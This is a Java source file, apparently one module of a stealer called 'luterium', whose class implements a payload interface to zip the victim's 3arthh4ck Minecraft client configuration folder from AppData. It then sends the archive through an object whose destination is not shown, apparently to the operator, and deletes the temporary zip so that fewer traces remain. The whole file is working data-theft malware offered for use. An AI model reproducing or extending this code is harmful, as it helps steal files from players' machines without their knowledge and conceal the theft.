package dev.peter.luterium.features;

import dev.peter.luterium.Main;
import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;
import org.zeroturnaround.zip.ZipUtil;

import java.io.File;
import java.util.Optional;

/**
 * @author Peter
 * @since 10/09/2022
 * Gets 3arthh4ck configs.
 */

public class EarthhackConfigs implements PayloadExecutor {
    Main main = new Main();

    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\earthhack";
    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofEarth.zip";

    @Override
    public void execute() throws Exception {
        ZipUtil.pack(new File(path), new File(zipPath));

        Optional<File> file = FileUtil.getFile(zipPath);
        file.ifPresent(main.theThing::send);

        deleteFileAfterSent();
    }

    public void deleteFileAfterSent() {
        File zipFile = new File(zipPath);

        zipFile.delete();
    }
}
